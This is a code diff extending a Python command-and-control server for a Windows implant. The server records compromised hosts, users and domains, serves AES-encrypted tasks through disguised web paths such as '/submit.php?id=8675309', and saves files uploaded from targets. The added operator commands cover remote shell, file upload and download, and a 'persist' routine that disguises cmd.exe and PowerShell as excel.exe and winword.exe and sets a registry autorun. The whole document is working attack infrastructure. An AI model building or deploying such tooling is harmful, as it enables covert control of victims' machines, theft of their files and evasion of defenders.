@@ -15,7 +15,7 @@ import sqlite3 as db
 from datetime import datetime
 import requests
 import re
-
+import shutil
 
 
 #global variables 
@@ -24,6 +24,7 @@ key = 'AAAAAAAAAAAAAAAA' #16 char for AES128. change on server and client-side t
 iv =  'BBBBBBBBBBBBBBBB'.encode('utf-8') #16 char for AES128. change on server and client-side to match
 path_to_cert_pem = '/etc/letsencrypt/live/your.domain.com/cert.pem'
 path_to_priv_pem = '/etc/letsencrypt/live/your.domain.com/privkey.pem'
+unique_file_name = '/submit.php?id=8675309'
 
 #colors
 green = "\033[32m"
@@ -63,7 +64,9 @@ except FileExistsError:
 
 conn = db.connect('implant.db')
 cursor = conn.cursor()
-table ="""CREATE TABLE IF NOT EXISTS IMPLANT_TABLE(HOSTNAME VARCHAR(255), 
+table ="""CREATE TABLE IF NOT EXISTS IMPLANT_TABLE
+                                        (HOSTNAME VARCHAR(255), 
+                                        USERNAME VARCHAR(255),
                                         DOMAIN VARCHAR(255),
                                         IP VARCHAR(255), 
                                         CHECKIN_TIME VARCHAR(255), 
@@ -125,9 +128,9 @@ def process():
         guid = guidp1.group(1)
 
         #print(guid)
-        print(green + "\n\n[*] " + reset + "Incoming results from " + cyan + x + reset)
+        print(green + "\n\n[*] " + reset + "Incoming results from " + cyan + "[" + guid + "]:" + "\n\n" + x + reset)
         
-        file = open("/opt/c2/web/" + guid + "/image.php?action=view", "w+")
+        file = open("/opt/c2/web/" + guid + unique_file_name, "w+")
         file.write("null")
         file.close()
         
@@ -150,39 +153,46 @@ def process():
         #print(x)
 
         hostname = x.split(',')[0]
-        #print(hostname)
-
+        #print("hostname :" + hostname)
 
         uID = x.split(',')[1]
-        #print(uID)
+        #print("uID :" + uID)
 
         ip = x.split(',')[2]
-        #print(ip)
+        #print("ip :" + ip)
+
+        domain = x.split(',')[3]
+        #print("domain :" + domain)
+
+        username = x.split(',')[4]
+        #print("username :" + username)
         
         now = datetime.now()
-        #print(now)
+        #print("current time:" + now)
         
 
         conn = db.connect('implant.db')
         cursor = conn.cursor()
-        table ="""CREATE TABLE IF NOT EXISTS IMPLANT_TABLE(HOSTNAME VARCHAR(255), 
+        table ="""CREATE TABLE IF NOT EXISTS IMPLANT_TABLE
+                                        (HOSTNAME VARCHAR(255),                   
+                                        USERNAME VARCHAR(255),
                                         DOMAIN VARCHAR(255),
                                         IP VARCHAR(255), 
                                         CHECKIN_TIME VARCHAR(255), 
                                         UNIQUE_ID int);"""
         cursor.execute(table)
-        cursor.execute("insert into IMPLANT_TABLE (HOSTNAME, DOMAIN, IP, CHECKIN_TIME, UNIQUE_ID) values (?, ?, ?, ?, ?)",
-            (hostname, "TBD", ip, now, uID)) 
+        cursor.execute("insert into IMPLANT_TABLE (HOSTNAME, USERNAME, DOMAIN, IP, CHECKIN_TIME, UNIQUE_ID) values (?, ?, ?, ?, ?, ?)",
+            (hostname, username, domain, ip, now, uID)) 
         conn.commit()
           
 
-        #Diplay column headers
+        ##Display column headers
         #print('\nColumns in IMPLANT_TABLE table:')
         #data=cursor.execute('''SELECT * FROM IMPLANT_TABLE''')
         #for column in data.description:
         #    print(column[0])
               
-        # Display all data
+        ##Display all data
         #print('\nData in IMPLANT_TABLE table:')
         #data=cursor.execute('''SELECT * FROM IMPLANT_TABLE''')
         #for row in data:
@@ -193,32 +203,60 @@ def process():
 
         conn.close()
 
-        os.mkdir("/opt/c2/web/" + uID)
-        file = open("/opt/c2/web/" + uID + "/image.php?action=view", "w+")
-        file.write("null")
-        file.close()
+        try:
+            os.mkdir("/opt/c2/web/" + uID)
+
+        except:
+            pass 
+
+        try:
+            file = open("/opt/c2/web/" + uID + unique_file_name, "w+")
+            file.write("null")
+            file.close()
+
+        except:
+            pass
+
+        try:
+            basePath = "/opt/c2/web/" + uID + "/"
+            dirToCreate = "receiver"
+            fullPath = os.path.join(basePath, dirToCreate)
+        
+            try:
+                os.makedirs(fullPath)
+
+            except:
+                pass
+        except:
+            pass  
 
         #self.wfile.write(GUID.format(self.path).encode('utf-8'))
 
+
     def do_fileupload(self):
-        form = cgi.FieldStorage(
-            fp=self.rfile,
-            headers=self.headers,
-            environ={'REQUEST_METHOD':'POST',
-                     'CONTENT_TYPE':self.headers['Content-Type'],
-                     })
-        filename = form['file'].filename
-        data = form['file'].file.read()
-        #open("/tmp/%s"%filename, "wb").write(data)
+            form = cgi.FieldStorage(
+                fp=self.rfile,
+                headers=self.headers,
+                environ={'REQUEST_METHOD':'POST',
+                         'CONTENT_TYPE':self.headers['Content-Type'],
+                         })
+            filename = form['file'].filename
+            data = form['file'].file.read()
+            #open("/tmp/%s"%filename, "wb").write(data)
 
-        decoded_string = base64.b64decode(data)
-        with open("/opt/c2/downloads/%s"%filename, "wb") as f:
-            f.write(decoded_string);
-            print("\n" + filename + ' successfully saved to /opt/c2/downloads\r')
+            decoded_string = base64.b64decode(data)
 
-        file = open("/opt/c2/web/image.php?action=view", "w+")
-        file.write("null")
-        file.close()
+            
+            try:
+                file2write = open("/opt/c2/downloads/%s"%filename, "wb")
+                file2write.write(decoded_string);
+                print(green + "\n[*] " + reset + filename + ' successfully saved to /opt/c2/downloads\r')
+                file2write.close()
+
+
+                
+            except:
+                pass
 
     def decrypt(enc,key,iv):
             enc = base64.b64decode(enc)
@@ -271,8 +309,16 @@ while True:
         print(green + "sessions " + reset + "(displays sessions in database)")
         print(green + "use <session number here> " + reset + "(set a session as active)")
         print(green + "back " + reset + "(leave a sesssion and go back)")
-        print(green + "task " + reset + "(preface every command with this. For example: task dir c:\\temp)")
-        print("Additional commands: " + green + "runningTasks" + reset + ", " + green + "runningServices" + reset + ", " + green + "serviceInfo" + reset + ", " + green + "shell" + reset + ", " + green + "download" + reset)
+        print(green + "dir " + reset + "(displays a simple directory listing. Example: dir c:\\temp)")
+        print(green + "copy " + reset + "(copys a local file on target from one location to another. Example: copy c:\\test.txt c:\\windows\\test.txt)")
+        print(green + "upload " + reset + "(upload a file from c2 server to target. Example: upload /tmp/file.exe c:\\temp\\file.exe)")
+        print(green + "download " + reset + "(downloads a file from target back to c2 server. Example: download c:\\temp\\file.exe")
+        print(green + "runningTasks " + reset + "(displays all running tasks on target. Example: runningTasks)")
+        print(green + "runningServices " + reset + "(displays all running services on target. Example: runningServices)")
+        print(green + "serviceInfo " + reset + "(displays information about a specific service on target. Example: serviceInfo ServiceNameHere)")
+        print(green + "persist " + reset + "(copies c:\\windows\\system32\\cmd.exe to AppData, renames to excel.exe, and modifies registry to run implant at next logon. Example: persist)")
+        print(green + "shell " + reset + "(copies powershell.exe to AppData, renames to winword.exe. Example: shell ipconfig)")
+
 
     else: 
         print()
@@ -300,24 +346,108 @@ while True:
         while True:
             command = input(str(now)[:19] + " [" + cyan + ActiveImplant + reset + "] " + " >> ") # date + UTC time
 
-            if "task" in command:
-                #print() 
-                TaskToRun = command.rsplit('task ')[-1]
-                print(green + "\n[*] " + reset + "Tasked "+ cyan + ActiveImplant + reset + " to run: " + TaskToRun + "\n")
-                
-                data = TaskToRun
-                
-                encrypt(TaskToRun,key,iv)
-                
-                encrypted = encrypt(data,key,iv)
-                encryptedStr = encrypted.decode("utf-8", "ignore")
-                #print(encryptedStr)
-
-                file = open("/opt/c2/web/" + ActiveImplant + "/image.php?action=view", "w+")
-                file.write(encryptedStr)
+            
+            if "dir" in command:
+                TaskToRun = command
+                print(green + "\n[*] " + reset + "Tasking "+ cyan + ActiveImplant + reset + " to run: " + TaskToRun + "\n")                
+                EncryptedTaskToRun = encrypt(TaskToRun,key,iv).decode("utf-8", "ignore")
+                file = open("/opt/c2/web/" + ActiveImplant + unique_file_name, "w+")
+                file.write(EncryptedTaskToRun)
                 file.close()
 
-                command = input(str(now)[:19] + " [" + cyan + ActiveImplant + reset + "] " + " >> ") # date + UTC time
+            else: 
+                pass
+
+            if "runningTasks" in command:
+                TaskToRun = command
+                print(green + "\n[*] " + reset + "Tasking "+ cyan + ActiveImplant + reset + " to run: " + TaskToRun + "\n")                
+                EncryptedTaskToRun = encrypt(TaskToRun,key,iv).decode("utf-8", "ignore")
+                file = open("/opt/c2/web/" + ActiveImplant + unique_file_name, "w+")
+                file.write(EncryptedTaskToRun)
+                file.close()
+
+            else: 
+                pass
+
+            if "runningServices" in command:
+                TaskToRun = command
+                print(green + "\n[*] " + reset + "Tasking "+ cyan + ActiveImplant + reset + " to run: " + TaskToRun + "\n")                
+                EncryptedTaskToRun = encrypt(TaskToRun,key,iv).decode("utf-8", "ignore")
+                file = open("/opt/c2/web/" + ActiveImplant + unique_file_name, "w+")
+                file.write(EncryptedTaskToRun)
+                file.close()
+
+            else: 
+                pass
+
+            if "serviceInfo" in command:
+                TaskToRun = command
+                print(green + "\n[*] " + reset + "Tasking "+ cyan + ActiveImplant + reset + " to run: " + TaskToRun + "\n")                
+                EncryptedTaskToRun = encrypt(TaskToRun,key,iv).decode("utf-8", "ignore")
+                file = open("/opt/c2/web/" + ActiveImplant + unique_file_name, "w+")
+                file.write(EncryptedTaskToRun)
+                file.close()
+
+            else: 
+                pass
+
+            if "download" in command:
+                TaskToRun = command
+                print(green + "\n[*] " + reset + "Tasking "+ cyan + ActiveImplant + reset + " to run: " + TaskToRun + "\n")                
+                EncryptedTaskToRun = encrypt(TaskToRun,key,iv).decode("utf-8", "ignore")
+                file = open("/opt/c2/web/" + ActiveImplant + unique_file_name, "w+")
+                file.write(EncryptedTaskToRun)
+                file.close()
+
+            else: 
+                pass
+
+            if "persist" in command:
+                TaskToRun = command
+                print(green + "\n[*] " + reset + "Tasking "+ cyan + ActiveImplant + reset + " to run: " + TaskToRun + "\n")                
+                EncryptedTaskToRun = encrypt(TaskToRun,key,iv).decode("utf-8", "ignore")
+                file = open("/opt/c2/web/" + ActiveImplant + unique_file_name, "w+")
+                file.write(EncryptedTaskToRun)
+                file.close()
+
+            else: 
+                pass
+
+            if "copy" in command:
+                TaskToRun = command
+                print(green + "\n[*] " + reset + "Tasking "+ cyan + ActiveImplant + reset + " to run: " + TaskToRun + "\n")                
+                EncryptedTaskToRun = encrypt(TaskToRun,key,iv).decode("utf-8", "ignore")
+                file = open("/opt/c2/web/" + ActiveImplant + unique_file_name, "w+")
+                file.write(EncryptedTaskToRun)
+                file.close()
+
+            else: 
+                pass
+
+            if "upload" in command:
+                TaskToRun = command
+                print(green + "\n[*] " + reset + "Tasking "+ cyan + ActiveImplant + reset + " to run: " + TaskToRun + "\n")                
+                
+                x, SourceFile, destination = TaskToRun.split(' ', 2)
+                   
+                shutil.copy(SourceFile, "/opt/c2/web/" + ActiveImplant + "/receiver/")
+                print(green + "\n[*] " + reset + "Local file " + SourceFile + " successfully staged for download in:  "+ "/opt/c2/web/" + ActiveImplant + "/receiver/" + "\n")  
+
+                EncryptedTaskToRun = encrypt(TaskToRun,key,iv).decode("utf-8", "ignore")
+                file = open("/opt/c2/web/" + ActiveImplant + unique_file_name, "w+")
+                file.write(EncryptedTaskToRun)
+                file.close()
+
+            else: 
+                pass
+
+            if "shell" in command:
+                TaskToRun = command
+                print(green + "\n[*] " + reset + "Tasking "+ cyan + ActiveImplant + reset + " to run: " + TaskToRun + "\n")                
+                EncryptedTaskToRun = encrypt(TaskToRun,key,iv).decode("utf-8", "ignore")
+                file = open("/opt/c2/web/" + ActiveImplant + unique_file_name, "w+")
+                file.write(EncryptedTaskToRun)
+                file.close()
 
             else: 
                 pass
@@ -325,6 +455,8 @@ while True:
             if "back" in command:
                 break
 
+    if "exit" in command:
+                exit()   
     else: 
         pass
 
